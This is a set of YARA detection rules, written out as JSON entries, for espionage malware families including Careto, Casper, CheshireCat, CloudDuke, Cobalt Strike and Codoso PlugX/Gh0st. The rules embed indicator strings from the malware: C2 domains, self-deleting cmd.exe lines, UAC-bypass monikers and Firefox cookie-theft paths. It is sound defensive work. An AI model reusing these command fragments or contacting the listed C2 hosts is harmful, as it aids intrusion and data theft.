  "Careto_OSX_SBD": "rule Careto_OSX_SBD \n{\n\n    meta:\n        author = \"AlienVault (Alberto Ortega)\"\n        description = \"TheMask / Careto OSX component signature\"\n        reference = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        date = \"2014/02/11\"\n\n    strings:\n        /* XORed \"/dev/null strdup() setuid(geteuid())\" */\n        $1 = {FF 16 64 0A 7E 1A 63 4D 21 4D 3E 1E 60 0F 7C 1A 65 0F 74 0B 3E 1C 7F 12}\n\n    condition:\n        all of them\n}",
  "Careto_CnC": "rule Careto_CnC \n{\n\n    meta:\n        author = \"AlienVault (Alberto Ortega)\"\n        description = \"TheMask / Careto CnC communication signature\"\n        reference = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        date = \"2014/02/11\"\n\n    strings:\n        $1 = \"cgi-bin/commcgi.cgi\" ascii wide\n        $2 = \"Group\" ascii wide\n        $3 = \"Install\" ascii wide\n        $4 = \"Bn\" ascii wide\n\n    condition:\n        all of them\n}",
  "Careto_CnC_domains": "rule Careto_CnC_domains \n{\n\n    meta:\n        author = \"AlienVault (Alberto Ortega)\"\n        description = \"TheMask / Careto known command and control domains\"\n        reference = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        date = \"2014/02/11\"\n\n    strings:\n        $1 = \"linkconf.net\" ascii wide nocase\n        $2 = \"redirserver.net\" ascii wide nocase\n        $3 = \"swupdt.com\" ascii wide nocase\n\n    condition:\n        any of them\n}",
  "Casper_Backdoor_x86": "rule Casper_Backdoor_x86\n{\n\n    meta:\n        description = \"Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/VRJNLo\"\n        date = \"2015/03/05\"\n        hash = \"f4c39eddef1c7d99283c7303c1835e99d8e498b0\"\n        score = 80\n\n    strings:\n        $s1 = \"\\\"svchost.exe\\\"\" fullword wide\n        $s2 = \"firefox.exe\" fullword ascii\n        $s3 = \"\\\"Host Process for Windows Services\\\"\" fullword wide\n        $x1 = \"\\\\Users\\\\*\" fullword ascii\n        $x2 = \"\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n        $x3 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n        $x4 = \"\\\\Documents and Settings\\\\*\" fullword ascii\n        $y1 = \"%s; %S=%S\" fullword wide\n        $y2 = \"%s; %s=%s\" fullword ascii\n        $y3 = \"Cookie: %s=%s\" fullword ascii\n        $y4 = \"http://%S:%d\" fullword wide\n        $z1 = \"http://google.com/\" fullword ascii\n        $z2 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)\" fullword ascii\n        $z3 = \"Operating System\\\"\" fullword wide\n\n    condition:\n        ( all of ($s*) ) or ( 3 of ($x*) and 2 of ($y*) and 2 of ($z*) )\n}",
  "Casper_EXE_Dropper": "rule Casper_EXE_Dropper\n{\n\n    meta:\n        description = \"Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/VRJNLo\"\n        date = \"2015/03/05\"\n        hash = \"e4cc35792a48123e71a2c7b6aa904006343a157a\"\n        score = 80\n\n    strings:\n        $s0 = \"<Command>\" fullword ascii\n        $s1 = \"</Command>\" fullword ascii\n        $s2 = \"\\\" /d \\\"\" fullword ascii\n        $s4 = \"'%s' %s\" fullword ascii\n        $s5 = \"nKERNEL32.DLL\" fullword wide\n        $s6 = \"@ReturnValue\" fullword wide\n        $s7 = \"ID: 0x%x\" fullword ascii\n        $s8 = \"Name: %S\" fullword ascii\n\n    condition:\n        7 of them\n}",
  "Casper_Included_Strings": "rule Casper_Included_Strings\n{\n\n    meta:\n        description = \"Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/VRJNLo\"\n        date = \"2015/03/06\"\n        score = 50\n\n    strings:\n        $a0 = \"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST\"\n        $a1 = \"& SYSTEMINFO) ELSE EXIT\"\n        $mz = { 4d 5a }\n        $c1 = \"domcommon.exe\" wide fullword                         // File Name\n        $c2 = \"jpic.gov.sy\" fullword                                // C2 Server\n        $c3 = \"aiomgr.exe\" wide fullword                            // File Name\n        $c4 = \"perfaudio.dat\" fullword                              // Temp File Name\n        $c5 = \"Casper_DLL.dll\" fullword                             // Name\n        $c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 }   // Decryption Key\n        $c7 = \"{4216567A-4512-9825-7745F856}\" fullword              // Mutex\n\n    condition:\n        all of ($a*) or ( $mz at 0 ) and ( 1 of ($c*) )\n}",
  "Casper_SystemInformation_Output": "rule Casper_SystemInformation_Output\n{\n\n    meta:\n        description = \"Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/VRJNLo\"\n        date = \"2015/03/06\"\n        score = 70\n\n    strings:\n        $a0 = \"***** SYSTEM INFORMATION ******\"\n        $a1 = \"***** SECURITY INFORMATION ******\"\n        $a2 = \"Antivirus: \"\n        $a3 = \"Firewall: \"\n        $a4 = \"***** EXECUTION CONTEXT ******\"\n        $a5 = \"Identity: \"\n        $a6 = \"<CONFIG TIMESTAMP=\"\n\n    condition:\n        all of them\n}",
  "CheshireCat_Sample2": "rule CheshireCat_Sample2\n{\n\n    meta:\n        description = \"Auto-generated rule - file dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8\"\n        author = \"Florian Roth\"\n        reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n        date = \"2015-08-08\"\n        score = 70\n        hash = \"dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8\"\n\n    strings:\n        $s0 = \"mpgvwr32.dll\" fullword ascii\n        $s1 = \"Unexpected failure of wait! (%d)\" fullword ascii\n        $s2 = \"\\\"%s\\\" /e%d /p%s\" fullword ascii\n        $s4 = \"error in params!\" fullword ascii\n        $s5 = \"sscanf\" fullword ascii\n        $s6 = \"<>Param : 0x%x\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 4 of ($s*)\n}",
  "CheshireCat_Gen1": "rule CheshireCat_Gen1\n{\n\n    meta:\n        description = \"Auto-generated rule - file ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300\"\n        author = \"Florian Roth\"\n        reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n        date = \"2015-08-08\"\n        super_rule = 1\n        score = 90\n        hash1 = \"ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300\"\n        hash2 = \"32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a\"\n        hash3 = \"63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb\"\n        hash4 = \"c074aeef97ce81e8c68b7376b124546cabf40e2cd3aff1719d9daa6c3f780532\"\n\n    strings:\n        $x1 = \"CAPESPN.DLL\" fullword wide\n        $x2 = \"WINF.DLL\" fullword wide\n        $x3 = \"NCFG.DLL\" fullword wide\n        $x4 = \"msgrthlp.dll\" fullword wide\n        $x5 = \"Local\\\\{c0d9770c-9841-430d-b6e3-575dac8a8ebf}\" fullword ascii\n        $x6 = \"Local\\\\{1ef9f94a-5664-48a6-b6e8-c3748db459b4}\" fullword ascii\n        $a1 = \"Interface\\\\%s\\\\info\" fullword ascii\n        $a2 = \"Interface\\\\%s\\\\info\\\\%s\" fullword ascii\n        $a3 = \"CLSID\\\\%s\\\\info\\\\%s\" fullword ascii\n        $a4 = \"CLSID\\\\%s\\\\info\" fullword ascii\n        $b1 = \"Windows Shell Icon Handler\" fullword wide\n        $b2 = \"Microsoft Shell Icon Handler\" fullword wide\n        $s1 = \"\\\\StringFileInfo\\\\%s\\\\FileVersion\" fullword ascii\n        $s2 = \"CLSID\\\\%s\\\\AuxCLSID\" fullword ascii\n        $s3 = \"lnkfile\\\\shellex\\\\IconHandler\" fullword ascii\n        $s4 = \"%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT\" fullword ascii\n        $s5 = \"%sMutex\" fullword ascii\n        $s6 = \"\\\\ShellIconCache\" fullword ascii\n        $s7 = \"+6Service Pack \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 350KB and 7 of ($s*) and 2 of ($a*) and 1 of ($b*) and 1 of ($x*)\n}",
  "CheshireCat_Gen2": "rule CheshireCat_Gen2\n{\n\n    meta:\n        description = \"Auto-generated rule - from files 32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a, 63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb\"\n        author = \"Florian Roth\"\n        reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n        date = \"2015-08-08\"\n        super_rule = 1\n        score = 70\n        hash1 = \"ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300\"\n        hash2 = \"32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a\"\n        hash3 = \"63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb\"\n        hash4 = \"c074aeef97ce81e8c68b7376b124546cabf40e2cd3aff1719d9daa6c3f780532\"\n\n    strings:\n        $a1 = \"Interface\\\\%s\\\\info\" fullword ascii\n        $a2 = \"Interface\\\\%s\\\\info\\\\%s\" fullword ascii\n        $a3 = \"CLSID\\\\%s\\\\info\\\\%s\" fullword ascii\n        $a4 = \"CLSID\\\\%s\\\\info\" fullword ascii\n        $b1 = \"Windows Shell Icon Handler\" fullword wide\n        $b2 = \"Microsoft Shell Icon Handler\" fullword wide\n        $s1 = \"\\\\StringFileInfo\\\\%s\\\\FileVersion\" fullword ascii\n        $s2 = \"CLSID\\\\%s\\\\AuxCLSID\" fullword ascii\n        $s3 = \"lnkfile\\\\shellex\\\\IconHandler\" fullword ascii\n        $s4 = \"%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT\" fullword ascii\n        $s5 = \"%sMutex\" fullword ascii\n        $s6 = \"\\\\ShellIconCache\" fullword ascii\n        $s7 = \"+6Service Pack \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 7 of ($s*) and 2 of ($a*) and 1 of ($b*)\n}",
  "CloudDuke_Malware": "rule CloudDuke_Malware\n{\n\n    meta:\n        description = \"Detects CloudDuke Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.f-secure.com/weblog/archives/00002822.html\"\n        date = \"2015-07-22\"\n        score = 60\n        hash1 = \"97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7\"\n        hash2 = \"88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f\"\n        hash3 = \"1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7\"\n        hash4 = \"97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7\"\n        hash5 = \"1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7\"\n        hash6 = \"88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f\"\n        hash7 = \"ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46\"\n        hash8 = \"97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7\"\n        hash9 = \"ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46\"\n        hash10 = \"ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145\"\n        hash11 = \"a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004\"\n        hash12 = \"56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e\"\n        hash13 = \"ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145\"\n        hash14 = \"a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004\"\n        hash15 = \"56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e\"\n\n    strings:\n        $s1 = \"ProcDataWrap\" fullword ascii\n        $s2 = \"imagehlp.dll\" fullword ascii\n        $s3 = \"dnlibsh\" fullword ascii\n        $s4 = \"%ws_out%ws\" fullword wide\n        $s5 = \"Akernel32.dll\" fullword wide\n        $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */\n        $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */\n        $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 720KB and 4 of ($s*) and 1 of ($op*)\n}",
  "SFXRAR_Acrotray": "rule SFXRAR_Acrotray\n{\n\n    meta:\n        description = \"Most likely a malicious file acrotray in SFX RAR / CloudDuke APT 5442.1.exe, 5442.2.exe\"\n        author = \"Florian Roth\"\n        reference = \"https://www.f-secure.com/weblog/archives/00002822.html\"\n        date = \"2015-07-22\"\n        super_rule = 1\n        score = 70\n        hash1 = \"51e713c7247f978f5836133dd0b8f9fb229e6594763adda59951556e1df5ee57\"\n        hash2 = \"5d695ff02202808805da942e484caa7c1dc68e6d9c3d77dc383cfa0617e61e48\"\n        hash3 = \"56531cc133e7a760b238aadc5b7a622cd11c835a3e6b78079d825d417fb02198\"\n\n    strings:\n        $s1 = \"winrarsfxmappingfile.tmp\" fullword wide /* PEStudio Blacklist: strings */\n        $s2 = \"GETPASSWORD1\" fullword wide /* PEStudio Blacklist: strings */\n        $s3 = \"acrotray.exe\" fullword ascii\n        $s4 = \"CryptUnprotectMemory failed\" fullword wide /* PEStudio Blacklist: strings */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2449KB and all of them\n}",
  "Cobalt_functions": "rule Cobalt_functions\n{\n\n    meta:\n\n        author=\"@j0sm1\"\n        url=\"https://www.securityartwork.es/2017/06/16/analisis-del-powershell-usado-fin7/\"\n        description=\"Detect functions coded with ROR edi,D; Detect CobaltStrike used by differents groups APT\"\n\n    strings:\n\n        $h1={58 A4 53 E5} // VirtualAllocEx\n        $h2={4C 77 26 07} // LoadLibraryEx\n        $h3={6A C9 9C C9} // DNSQuery_UTF8\n        $h4={44 F0 35 E0} // Sleep\n        $h5={F4 00 8E CC} // lstrlen\n\n    condition:\n        2 of ( $h* )\n}",
  "Codoso_PlugX_3": "rule Codoso_PlugX_3\n{\n\n    meta:\n        description = \"Detects Codoso APT PlugX Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"74e1e83ac69e45a3bee78ac2fac00f9e897f281ea75ed179737e9b6fe39971e3\"\n\n    strings:\n        $s1 = \"Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password.\" fullword wide\n        $s2 = \"mcs.exe\" fullword ascii\n        $s3 = \"McAltLib.dll\" fullword ascii\n        $s4 = \"WinRAR self-extracting archive\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1200KB and all of them\n}",
  "Codoso_PlugX_2": "rule Codoso_PlugX_2\n{\n\n    meta:\n        description = \"Detects Codoso APT PlugX Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"b9510e4484fa7e3034228337768176fce822162ad819539c6ca3631deac043eb\"\n\n    strings:\n        $s1 = \"%TEMP%\\\\HID\" fullword wide\n        $s2 = \"%s\\\\hid.dll\" fullword wide\n        $s3 = \"%s\\\\SOUNDMAN.exe\" fullword wide\n        $s4 = \"\\\"%s\\\\SOUNDMAN.exe\\\" %d %d\" fullword wide\n        $s5 = \"%s\\\\HID.dllx\" fullword wide\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them\n}",
  "Codoso_CustomTCP_4": "rule Codoso_CustomTCP_4\n{\n\n    meta:\n        description = \"Detects Codoso APT CustomTCP Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash1 = \"ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0\"\n        hash2 = \"130abb54112dd47284fdb169ff276f61f2b69d80ac0a9eac52200506f147b5f8\"\n        hash3 = \"3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa\"\n        hash4 = \"02cf5c244aebaca6195f45029c1e37b22495609be7bdfcfcd79b0c91eac44a13\"\n\n    strings:\n        $x1 = \"varus_service_x86.dll\" fullword ascii\n        $s1 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n        $s2 = \"net start %%1\" fullword ascii\n        $s3 = \"ping 127.1 > nul\" fullword ascii\n        $s4 = \"McInitMISPAlertEx\" fullword ascii\n        $s5 = \"sc start %%1\" fullword ascii\n        $s6 = \"net stop %%1\" fullword ascii\n        $s7 = \"WorkerRun\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 400KB and 5 of them ) or ( $x1 and 2 of ($s*) )\n}",
  "Codoso_CustomTCP_3": "rule Codoso_CustomTCP_3\n{\n\n    meta:\n        description = \"Detects Codoso APT CustomTCP Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"d66106ec2e743dae1d71b60a602ca713b93077f56a47045f4fc9143aa3957090\"\n\n    strings:\n        $s1 = \"DnsApi.dll\" fullword ascii\n        $s2 = \"softWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains\\\\%s\" ascii\n        $s3 = \"CONNECT %s:%d hTTP/1.1\" ascii\n        $s4 = \"CONNECT %s:%d HTTp/1.1\" ascii\n        $s5 = \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)\" ascii\n        $s6 = \"iphlpapi.dll\" ascii\n        $s7 = \"%systemroot%\\\\Web\\\\\" ascii\n        $s8 = \"Proxy-Authorization: Negotiate %s\" ascii\n        $s9 = \"CLSID\\\\{%s}\\\\InprocServer32\" ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them\n}",
  "Codoso_CustomTCP_2": "rule Codoso_CustomTCP_2\n{\n\n    meta:\n        description = \"Detects Codoso APT CustomTCP Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3\"\n\n    strings:\n        $s1 = \"varus_service_x86.dll\" fullword ascii\n        $s2 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n        $s3 = \"net start %%1\" fullword ascii\n        $s4 = \"ping 127.1 > nul\" fullword ascii\n        $s5 = \"McInitMISPAlertEx\" fullword ascii\n        $s6 = \"sc start %%1\" fullword ascii\n        $s7 = \"B_WKNDNSK^\" fullword ascii\n        $s8 = \"net stop %%1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 406KB and all of them\n}",
  "Codoso_PGV_PVID_6": "rule Codoso_PGV_PVID_6\n{\n\n    meta:\n        description = \"Detects Codoso APT PGV_PVID Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"4b16f6e8414d4192d0286b273b254fa1bd633f5d3d07ceebd03dfdfc32d0f17f\"\n\n    strings:\n        $s0 = \"rundll32 \\\"%s\\\",%s\" fullword ascii\n        $s1 = \"/c ping 127.%d & del \\\"%s\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 6000KB and all of them\n}",
  "Codoso_Gh0st_3": "rule Codoso_Gh0st_3\n{\n\n    meta:\n        description = \"Detects Codoso APT Gh0st Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"bf52ca4d4077ae7e840cf6cd11fdec0bb5be890ddd5687af5cfa581c8c015fcd\"\n\n    strings:\n        $x1 = \"RunMeByDLL32\" fullword ascii\n        $s1 = \"svchost.dll\" fullword wide\n        $s2 = \"server.dll\" fullword ascii\n        $s3 = \"Copyright ? 2008\" fullword wide\n        $s4 = \"testsupdate33\" fullword ascii\n        $s5 = \"Device Protect Application\" fullword wide\n        $s6 = \"MSVCP60.DLL\" fullword ascii /* Goodware String - occured 1 times */\n        $s7 = \"\u001fmail-news.eicp.net\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 195KB and $x1 or 4 of them\n}",
  "Codoso_Gh0st_2": "rule Codoso_Gh0st_2\n{\n\n    meta:\n        description = \"Detects Codoso APT Gh0st Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841\"\n\n    strings:\n        $s0 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n        $s1 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n        $s13 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n        $s14 = \"%s -r debug 1\" fullword ascii\n        $s15 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n        $s17 = \"RunMeByDLL32\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 1 of them\n}",
  "Codoso_CustomTCP": "rule Codoso_CustomTCP\n{\n\n    meta:\n        description = \"Codoso CustomTCP Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        hash = \"b95d7f56a686a05398198d317c805924c36f3abacbb1b9e3f590ec0d59f845d8\"\n\n    strings:\n        $s4 = \"wnyglw\" fullword ascii\n        $s5 = \"WorkerRun\" fullword ascii\n        $s7 = \"boazdcd\" fullword ascii\n        $s8 = \"wayflw\" fullword ascii\n        $s9 = \"CODETABL\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 405KB and all of them\n}",
  "Codoso_PGV_PVID_5": "rule Codoso_PGV_PVID_5\n{\n\n    meta:\n        description = \"Detects Codoso APT PGV PVID Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n        hash2 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n\n    strings:\n        $s1 = \"/c del %s >> NUL\" fullword ascii\n        $s2 = \"%s%s.manifest\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}",
  "Codoso_Gh0st_1": "rule Codoso_Gh0st_1\n{\n\n    meta:\n        description = \"Detects Codoso APT Gh0st Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841\"\n        hash2 = \"7dc7cec2c3f7e56499175691f64060ebd955813002d4db780e68a8f6e7d0a8f8\"\n        hash3 = \"d7004910a87c90ade7e5ff6169f2b866ece667d2feebed6f0ec856fb838d2297\"\n\n    strings:\n        $x1 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n        $x2 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n        $x3 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n        $x4 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n        $s1 = \"spideragent.exe\" fullword ascii\n        $s2 = \"AVGIDSAgent.exe\" fullword ascii\n        $s3 = \"kavsvc.exe\" fullword ascii\n        $s4 = \"mspaint.exe\" fullword ascii\n        $s5 = \"kav.exe\" fullword ascii\n        $s6 = \"avp.exe\" fullword ascii\n        $s7 = \"NAV.exe\" fullword ascii\n        $c1 = \"Elevation:Administrator!new:\" wide\n        $c2 = \"Global\\\\RUNDLL32EXITEVENT_NAME{12845-8654-543}\" fullword ascii\n        $c3 = \"\\\\sysprep\\\\sysprep.exe\" fullword wide\n        $c4 = \"\\\\sysprep\\\\CRYPTBASE.dll\" fullword wide\n        $c5 = \"Global\\\\TERMINATEEVENT_NAME{12845-8654-542}\" fullword ascii\n        $c6 = \"ConsentPromptBehaviorAdmin\" fullword ascii\n        $c7 = \"\\\\sysprep\" fullword wide\n        $c8 = \"Global\\\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ( 4 of ($s*) or 4 of ($c*) ) or 1 of ($x*) or 6 of ($c*)\n}",
  "Codoso_PGV_PVID_4": "rule Codoso_PGV_PVID_4\n{\n\n    meta:\n        description = \"Detects Codoso APT PlugX Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n        hash2 = \"8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761\"\n        hash3 = \"b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1\"\n        hash4 = \"b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3\"\n        hash5 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n\n    strings:\n        $x1 = \"dropper, Version 1.0\" fullword wide\n        $x2 = \"dropper\" fullword wide\n        $x3 = \"DROPPER\" fullword wide\n        $x4 = \"About dropper\" fullword wide\n        $s1 = \"Microsoft Windows Manager Utility\" fullword wide\n        $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" fullword ascii /* Goodware String - occured 9 times */\n        $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\" fullword ascii /* Goodware String - occured 10 times */\n        $s4 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii /* Goodware String - occured 46 times */\n        $s5 = \"<supportedOS Id=\\\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\\\"></supportedOS>\" fullword ascii /* Goodware String - occured 65 times */\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and 1 of ($x*) and 2 of ($s*)\n}",
  "Codoso_PlugX_1": "rule Codoso_PlugX_1\n{\n\n    meta:\n        description = \"Detects Codoso APT PlugX Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        date = \"2016-01-30\"\n        super_rule = 1\n        hash1 = \"0b8cbc9b4761ab35acce2aa12ba2c0a283afd596b565705514fd802c8b1e144b\"\n        hash2 = \"448711bd3f689ceebb736d25253233ac244d48cb766834b8f974c2e9d4b462e8\"\n        hash3 = \"fd22547497ce52049083092429eeff0599d0b11fe61186e91c91e1f76b518fe2\"\n\n    strings:\n        $s1 = \"GETPASSWORD1\" fullword ascii\n        $s2 = \"NvSmartMax.dll\" fullword ascii\n        $s3 = \"LICENSEDLG\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}",
